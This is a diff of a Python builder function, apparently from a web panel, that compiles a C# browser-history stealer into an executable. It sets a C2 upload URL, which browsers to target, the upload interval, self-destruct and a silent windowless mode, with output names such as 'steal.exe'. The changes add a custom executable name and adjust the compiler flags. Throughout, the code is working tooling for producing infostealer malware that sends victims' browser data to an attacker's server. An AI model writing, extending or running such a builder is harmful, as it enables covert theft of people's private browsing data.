@@ -2,13 +2,13 @@
 import os
 import subprocess
 import re
-import uuid
 
-def build_executable(upload_url, target_browser, upload_interval, self_destruct, silent, output_dir="static/builds"):
+def build_executable(exe_name, upload_url, target_browser, upload_interval, self_destruct, silent, output_dir="static/builds"):
     """
     Build the C# executable with specified configuration.
     
     Args:
+        exe_name (str): Name of the output executable (e.g., steal.exe)
         upload_url (str): The C2 URL for uploads
         target_browser (int): 0=Chrome, 1=Edge, 2=Both
         upload_interval (int): Hours between uploads (0 for once)
@@ -19,30 +19,27 @@ def build_executable(upload_url, target_browser, upload_interval, self_destruct,
     Returns:
         tuple: (bool, str) - (Success status, Output filename or error message)
     """
-    # Compute path to Program.cs relative to webapp directory
     base_dir = os.path.dirname(os.path.abspath(__file__))  # webapp directory
     source_file = os.path.join(base_dir, "..", "history_stealer", "Program.cs")
-    temp_file = os.path.join(base_dir, f"Program_temp_{uuid.uuid4().hex}.cs")
-    output_exe = os.path.join(base_dir, output_dir, f"steal_{uuid.uuid4().hex}.exe")
+    temp_file = os.path.join(base_dir, f"Program_temp_{os.urandom(8).hex()}.cs")
+    output_exe = os.path.join(base_dir, output_dir, exe_name)
 
     # Validate inputs
-    if not upload_url.startswith("http://") and not upload_url.startswith("https://"):
+    if not upload_url.startswith(("http://", "https://")):
         return False, "Upload URL must start with http:// or https://"
     if target_browser not in [0, 1, 2]:
         return False, "Target browser must be 0 (Chrome), 1 (Edge), or 2 (Both)"
     if not isinstance(upload_interval, int) or upload_interval < 0:
         return False, "Upload interval must be a non-negative integer"
-    
+    if not os.path.exists(source_file):
+        return False, f"Source file {source_file} not found"
+
     # Map target_browser to string
     target_map = {0: "CHROME", 1: "EDGE", 2: "BOTH"}
     target = target_map[target_browser]
 
     # Ensure output directory exists
     os.makedirs(os.path.join(base_dir, output_dir), exist_ok=True)
-
-    # Check if source file exists
-    if not os.path.exists(source_file):
-        return False, f"Source file {source_file} not found"
 
     # Read the original Program.cs
     try:
@@ -83,11 +80,15 @@ def build_executable(upload_url, target_browser, upload_interval, self_destruct,
     # mcs command to compile
     mcs_command = [
         "mcs",
-        f"-target:{'winexe' if silent else 'exe'}",  # winexe for silent, exe for console
+        "-sdk:4.5",
+        f"-target:{'winexe' if silent else 'exe'}",
         f"-out:{output_exe}",
         "-platform:x64",
-        "-r:System.Net.Http.dll",
-        "-r:System.Text.Json.dll",
+        "-r:/usr/lib/mono/4.5/System.Net.Http.dll",
+        "-r:/usr/lib/mono/4.5/System.IO.Compression.dll",
+        "-r:/usr/lib/mono/4.5/System.IO.Compression.FileSystem.dll",
+        "-r:" + os.path.join(base_dir, "..", "history_stealer", "Newtonsoft.Json.dll"),
+        "-langversion:7.1",
         temp_file
     ]
 
@@ -99,7 +100,5 @@ def build_executable(upload_url, target_browser, upload_interval, self_destruct,
     except FileNotFoundError:
         return False, "mcs compiler not found. Install mono-complete with 'sudo apt install mono-complete'"
     finally:
-        # Clean up temporary file
         if os.path.exists(temp_file):
             os.remove(temp_file)
-
